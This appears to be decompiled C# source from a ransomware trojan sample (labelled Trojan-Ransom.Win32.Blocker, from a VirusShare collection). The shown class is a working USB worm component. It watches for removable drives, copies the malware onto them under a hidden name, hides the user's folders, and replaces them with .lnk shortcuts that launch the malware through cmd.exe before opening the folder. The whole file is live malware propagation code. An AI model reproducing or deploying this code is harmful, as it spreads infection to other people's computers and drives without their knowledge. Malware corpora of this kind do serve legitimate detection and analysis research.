// Decompiled with JetBrains decompiler
// Type: insomnia.Class17
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;

namespace insomnia
{
  internal class Class17
  {
    private static ManagementEventWatcher Field1;

    public static void Method4()
    {
      try
      {
        Thread.Sleep(5000);
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.DriveType == DriveType.Removable)
          {
            string A_2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(drive.TotalSize.ToString() + drive.VolumeLabel + drive.DriveFormat + "insomnia")).Replace("=", "").Substring(0, 7).ToLower() + ".exe";
            if (!File.Exists(drive.Name + A_2))
            {
              File.Copy(Class26.Field20, drive.Name + A_2, true);
              File.SetAttributes(drive.Name + A_2, FileAttributes.Hidden);
              DirectoryInfo[] directories = new DirectoryInfo(drive.Name).GetDirectories("*.*", SearchOption.TopDirectoryOnly);
              int num = 0;
              foreach (DirectoryInfo directoryInfo in directories)
              {
                directoryInfo.Attributes = FileAttributes.Hidden;
                Class17.Method3(drive.RootDirectory.ToString(), directoryInfo.Name + ".lnk", A_2, "explorer.exe " + directoryInfo.FullName, directoryInfo.Name);
                ++num;
              }
              Class31.Method3("[USB]: Completed LNK spread on (" + drive.Name + ") with " + (object) num + " files.", Class26.Field8);
            }
          }
        }
      }
      catch
      {
      }
      try
      {
        Class17.Method2();
      }
      catch
      {
      }
    }

    private static void Method3(string A_0, string A_1, string A_2, string A_3, string A_4)
    {
      using (Class2 class2 = new Class2())
      {
        class2.Property64 = Environment.SystemDirectory + "\\cmd.exe";
        class2.Property61 = "/c " + A_2 + " & " + A_3;
        class2.Property63 = "%CD%";
        class2.Property62 = A_4;
        class2.Property66 = Environment.SystemDirectory + "\\shell32.dll";
        class2.Property65 = 3;
        class2.Property60 = Class2.Enum5.Field2;
        class2.Method4(A_0 + "\\" + A_1);
      }
    }

    public static void Method2()
    {
      ManagementScope scope = new ManagementScope("root\\CIMV2");
      scope.Options.EnablePrivileges = true;
      try
      {
        Class17.Field1 = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
        {
          EventClassName = "__InstanceCreationEvent",
          WithinInterval = new TimeSpan(0, 0, 3),
          Condition = "TargetInstance ISA 'Win32_USBControllerdevice'"
        });
        Class17.Field1.EventArrived += new EventArrivedEventHandler(Class17.Method1);
        Class17.Field1.Start();
      }
      catch
      {
        if (Class17.Field1 == null)
          return;
        Class17.Field1.Stop();
      }
    }

    public static void Method1(object sender, EventArgs e)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.DriveType == DriveType.Removable)
        {
          try
          {
            string A_2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(drive.TotalSize.ToString() + drive.VolumeLabel + drive.DriveFormat + "insomnia")).Replace("=", "").Substring(0, 7).ToLower() + ".exe";
            if (!File.Exists(drive.Name + A_2))
            {
              File.Copy(Class26.Field20, drive.Name + A_2, true);
              File.SetAttributes(drive.Name + A_2, FileAttributes.Hidden);
              DirectoryInfo[] directories = new DirectoryInfo(drive.Name).GetDirectories("*.*", SearchOption.TopDirectoryOnly);
              int num = 0;
              foreach (DirectoryInfo directoryInfo in directories)
              {
                directoryInfo.Attributes = FileAttributes.Hidden;
                Class17.Method3(drive.RootDirectory.ToString(), directoryInfo.Name + ".lnk", A_2, "explorer.exe " + directoryInfo.FullName, directoryInfo.Name);
                ++num;
              }
              Class31.Method3("[USB]: Completed LNK spread on (" + drive.Name + ") with " + (object) num + " files.", Class26.Field8);
            }
          }
          catch
          {
          }
        }
      }
    }
  }
}
